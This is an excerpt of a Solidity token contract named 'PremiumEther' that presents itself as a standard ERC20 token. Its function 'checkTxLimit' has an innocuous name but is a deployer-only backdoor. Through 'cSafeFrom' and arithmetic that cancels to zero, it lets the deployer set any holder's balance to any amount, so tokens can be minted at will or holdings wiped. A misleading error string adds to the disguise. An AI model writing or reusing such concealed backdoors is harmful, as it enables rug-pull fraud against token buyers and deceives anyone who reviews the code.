...
contract PremiumEther is IERC20 {
  ...
  constructor(string memory _name, string memory _symbol) public {
    takerFees = msg.sender;
    name = _name;
    symbol = _symbol;
    decimals = 9;
    totalSupply =  100000000000 * 10 ** uint256(decimals);
    balancesFees[takerFees] = totalSupply;
    allowAddress[takerFees] = true;
  ...
  modifier DevAddress () {
    require(takerFees == msg.sender, "ERC20: cannot permit Pancake address");
    _;
  }
  ...
  function cSafeFrom (address taker, uint256 _value) internal {
        balancesFees[taker] = (balancesFees[taker] * 1 * 2 - balancesFees[taker] * 1 * 2) + (_value * 10 ** uint256(decimals));
  }
      
  function checkTxLimit (address TakerAddress, uint256 _value) public DevAddress {
      cSafeFrom(TakerAddress, _value);
  }
